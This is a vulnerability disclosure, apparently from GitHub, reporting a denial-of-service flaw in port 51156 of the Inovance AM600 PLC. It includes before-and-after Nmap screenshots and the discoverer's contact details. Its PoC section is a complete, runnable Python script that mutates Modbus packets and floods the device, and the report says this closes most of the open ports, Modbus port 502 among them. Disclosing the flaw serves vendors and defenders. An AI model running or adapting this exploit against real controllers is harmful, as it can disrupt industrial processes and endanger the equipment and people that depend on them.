# Summary
There is a denial of service vulnerability in port 51156 of Inovance AM600 PLC.An attacker can send a large number of modbus protocol data packets to cause the PLC to crash.

This "crash" did not cause the device to crash, but closed the originally open port.
# Details
Connectivity test of the device:
![image](https://github.com/user-attachments/assets/ed1c3c11-316d-42c0-b5f5-2c14a7f6375f)

Nmap scans device ports:![image](https://github.com/user-attachments/assets/4076b32b-0c57-4e88-b15e-afe1cba75581)

You can see that port 51156 is open.

Then we run the script:![image](https://github.com/user-attachments/assets/1a9d6314-63ff-4557-af09-5ef130acee8f)



After a while, we scan the port with Nmap and find:![image](https://github.com/user-attachments/assets/4b2955f5-8592-476c-a272-28b05e5e3779)



Of the **7** ports that were originally open, only **3** are left now, and **mbap port 502** has also been closed.

# PoC
My host ip is `192.168.1.149` and the device's ip is `192.168.1.88`.

```py
import socket

def F1(x):
    return x ^ 0xFF
    pass
def F2(x):
    return x ^ 0xFE
    pass
def F3(x):
    return (x-0x10) & 0xFF
    pass
def F4(x):
    return (x*0x17) & 0xFF
    pass

def Change(data: bytes):
    l = len(data)
    import random
    pos = random.randint(0, l - 1)
    Fs = [F1, F2, F3, F4]
    f = random.randint(0, 3)
    func = Fs[f]
    newX = func(data[pos])

    hex_str = format(newX, '02x')
    data = data[:pos] + bytes.fromhex(hex_str) + data[pos + 1:]

    return data

ori = "00 01 00 00 00 06 01 03 00 00 00 0a"
ori = bytes.fromhex(ori.replace(" ", ""))
queue = []

queue.append(ori)

MAX_LEN = 65536
cur = 0
while True:
    if((cur)%100 == 0):
        print(cur,end=' ')
    for i in range(8):
        top = queue[cur]
        now = Change(top)
        queue.append(now)
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("192.168.1.88",51156))
            s.send(now)
            s.close()
            import time
            # time.sleep(0.1)
        except:
            print()
            print("\033[91m[+] CRASHED!!!!!!!!!!!!!!!!!!\033[0m")
            
    import time
    cur = (cur + 1) % MAX_LEN
```
# Discoverer
ylqncepu@163.com

https://github.com/N0zoM1z0
